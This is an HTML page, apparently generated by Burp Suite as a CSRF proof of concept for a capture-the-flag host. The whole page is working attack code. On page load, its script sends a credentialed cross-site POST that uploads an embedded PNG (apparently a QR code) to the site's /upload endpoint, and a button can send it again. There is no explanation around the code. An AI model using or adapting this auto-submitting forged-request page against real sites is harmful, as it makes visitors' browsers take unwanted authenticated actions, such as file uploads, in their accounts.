<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/ctf.widyasecurity.com\/upload", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,image\/png,image\/svg+xml,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------26602337242943411461844867649");
        xhr.withCredentials = true;
        var body = "-----------------------------26602337242943411461844867649\r\n" + 
          "Content-Disposition: form-data; name=\"qrcode\"; filename=\"truffle.png\"\r\n" + 
          "Content-Type: image/png\r\n" + 
          "\r\n" + 
          "\x89PNG\r\n" + 
          "\x1a\n" + 
          "\x00\x00\x00\rIHDR\x00\x00\x00\xfa\x00\x00\x00\xfa\x01\x03\x00\x00\x00\xb2\"\xc8~\x00\x00\x00\x06PLTE\xff\xff\xff\x00\x00\x00U\xc2\xd3~\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x01\xcfIDATh\x81\xed\x991\x92\xc30\x08E\xf1\xb8P\xa9#\xf8(\x3eZ|4\x1fEGH\xa9\xc2c\x16\x3eH\xf1x\xb3\x9b\x3e\x82\x99\x14\xc8/\r\xc3\xff\x06\x99\xe8S\x3c\x18\xf1\xa4tH\xc6\xf2[5Mv\xcc\xdb0\xc0\xa6\xd5\xc8rrL~\xb4\x16\xa2TQ\xa5\x00.\x80T\xaed\xa9$\xf3)\'\n" + 
          "h]\xeb\xac\xf9x@/\x14\xf3N\x14\xc0\x9f\x00\xd1|N\xaa\xbc\xc7N\xcb\xdbR\x7f;\xe0\xca\xaa\n" + 
          "\xb0X\xd2n\xe9/\xe9\x8d\x0e\xb8W\x1b \'\x8f}E\x83\xdd\xcd\xfc\xcb\x81KL\xa76\x94Z\xb16\xd8\x9b\x18\x1a@%KF\xd9N\xb3\xea}a\xae\xe9hR\x1c\x03\xd0X\n" + 
          "\t\xa1V\x8c\x8e\x82\x05INS\xeb\xa8\x00\x14XY\x9fK\xe9H\xa5\x87#\xa4\xb3\xbe\xec)\x00\x07TjbQ\xd6s\xec\xff\x90\xb4\xe2\xb9\x99\xf9\x08\x80\xe4\xd2B\xb6\x3e\xd8;\x0bC\x8e\xc4\xdc\xff\x10@\x03\xc8\xc7\xbf&=T\x15{\xd76\x0c\xa0S\x8d\x9a\xb3\xa4\x18\x8b\xb1Fe8\x90I/\x80\xb3=\x97\xc85q\x9f\x82\xf8\x89\x86rm\x8e\x01\xa8\x94\x8aO\xc5\xben\xee\x94Mhg\x00/@-\x07/\xf7\x8a\x034\xd9\x82\x9b\x1c\xec\x9f\xe3\x00\xb2o\x16(\x0b\x85\xc2tX\x14\x9f\xd9\xc7\xc5\x00\x1c\x10\xcbY\x9e\xb9R\xf3$\xa9\xa4\xa4\xaf\xb9:\x80^I\xdc\xe4\xe0\xa5f\xe1\xeb\xc6\xed\xaa\xe7\xbb\x81\x16\x89\xed\xeao\x13\xf3\xd6\x99\x87\xe6\xfe\xf6\x0f\xe0~QC0\xeb\xd5S\xac\x134\x0c\x80Z\xd9\xd5\x9f\xd7le\x14\xca\xd7\xac\x00\x1a\xd0\xa4g\xd3\xa0\xae]Mz\xcc\x03\x02\x0c\xcb\xf1\xa1G\x94v\xccm!\r\xe0\x06`l\xe6\xfeq\xa1Ko\x10\xc0\x94\x95\xda\x8d\x84\xec\x9b\xe4W\xa0\x01\\\x01\xd3\x98~\x8dzI\x8f\xf2\xe5F+\x80\xe6\xcd\xff\xc6\x0f\x96\xb4\x1d\xb8V\x186Q\x00\x00\x00\x00IEND\xaeB`\x82\r\n" + 
          "-----------------------------26602337242943411461844867649--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
